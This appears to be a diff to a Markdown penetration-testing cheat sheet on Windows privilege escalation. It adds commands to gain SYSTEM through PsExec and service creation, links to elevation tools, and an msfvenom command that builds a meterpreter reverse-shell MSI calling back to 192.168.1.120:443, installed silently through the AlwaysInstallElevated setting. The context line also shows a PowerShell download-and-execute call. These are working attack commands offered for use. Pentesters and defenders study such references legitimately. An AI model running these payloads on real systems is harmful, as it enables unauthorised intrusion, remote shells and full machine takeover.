@@ -132,7 +132,12 @@ Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient
 #### Run as NTAuth/System from local admin
 ```
 PsExec.exe -accepteula -i -s %SystemRoot%\System32\cmd.exe
+sc create newservicename binPath= "C:\windows\system32\cmd.exe"
+sc start newservicename
 ```
+
+### Elevate from local service or network service
+https://github.com/itm4n/FullPowers
 
 ### Weak Service binary permission or unquoted service path
 ```
@@ -146,3 +151,12 @@ netstat -ano
 tasklist /svc
 tasklist /v /fi "pid eq 123"
 ```
+
+### always install elevated
+```
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.120 lport=443 –f msi > shell.msi
+msiexec /quiet /qn /i shell.msi
+```
+
+### DLL injection
+https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking
